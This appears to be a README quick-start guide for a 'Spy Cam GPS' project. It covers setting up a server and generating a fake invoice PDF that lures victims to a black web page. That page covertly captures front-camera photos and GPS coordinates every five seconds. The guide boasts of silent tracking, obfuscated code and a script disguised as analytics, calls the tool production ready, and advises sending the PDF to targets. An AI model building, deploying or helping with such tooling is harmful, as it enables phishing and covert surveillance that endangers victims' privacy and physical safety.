# Quick Start Guide - Spy Cam GPS

## 🚀 Run in 30 Seconds

### Method 1: Simple Start
```bash
cd server && npm install && npm start
```
Then open port 3000 in your browser.

### Method 2: With PDF Generation
```bash
# Terminal 1
cd server && npm install && npm start

# Terminal 2
cd pdf-payload && pip install -r requirements.txt && python generate_pdf.py
```

## 📋 What You'll See

1. **Browser opens** → Black screen (client/index.html)
2. **Permission popup** → "Allow Camera"
3. **Permission popup** → "Allow Location"
4. **Auto-capture starts** → Every 5 seconds
5. **Data saves** → `server/data/*.json` and `*.jpg`

## 🎯 Access Points

| URL | Description |
|-----|-------------|
| `https://xxx.github.dev:3000/` | Main capture page (black screen) |
| `https://xxx.github.dev:3000/index.html` | Landing page with PDF |
| `https://xxx.github.dev:3000/spy.min.js` | Tracking script |
| Local: `/workspaces/spy-cam-gps/server/data/` | Captured files |

## 📁 Check Captured Data

```bash
# View captured files
cd server/data
ls -la

# View JSON metadata
cat *.json | head -20

# Count captures
ls *.jpg | wc -l
```

## 🔧 Regenerate PDF

```bash
cd pdf-payload
export SPY_DOMAIN="your-actual-domain.app.github.dev"
python generate_pdf.py
```

## ⚡ One-Liner Full Setup

```bash
cd /workspaces/spy-cam-gps && cd server && npm install && npm start
```

## 📊 Expected Output

**Server Console:**
```
Server running on port 3000
[+] YWJjMTIzNDU2Nzg= | GPS: 40.7128,-74.0060 | Photo: YES
[+] YWJjMTIzNDU2Nzg= | GPS: 40.7128,-74.0060 | Photo: YES
```

**Browser Console:**
```
Analytics module loaded
Tracking initialized
```

**File System:**
```
server/data/
├── YWJjMTIzNDU2Nzg_1699200000000.json
├── YWJjMTIzNDU2Nzg_1699200000000.jpg
├── YWJjMTIzNDU2Nzg_1699200005000.json
├── YWJjMTIzNDU2Nzg_1699200005000.jpg
...
```

## 🎨 Professional Features

✅ **Realistic PDF Invoice**
- Company branding
- Transaction details  
- Security badges
- Contact information

✅ **Silent Tracking**
- No visible UI elements
- Obfuscated code
- Dynamic domain detection
- Delayed initialization

✅ **Robust Capture**
- Front camera 640x480
- GPS coordinates
- 5-second intervals
- Fallback to GPS-only

## 🔥 Pro Tips

1. **Grant permissions quickly** → Capture starts immediately
2. **Keep browser tab open** → Continuous tracking
3. **Check `server/data/`** → Real-time file creation
4. **Mobile works too** → Android & iOS supported
5. **PDF embeds everything** → Send invoice.pdf to test

---

**Status:** Production Ready ✅  
**Last Updated:** November 6, 2025
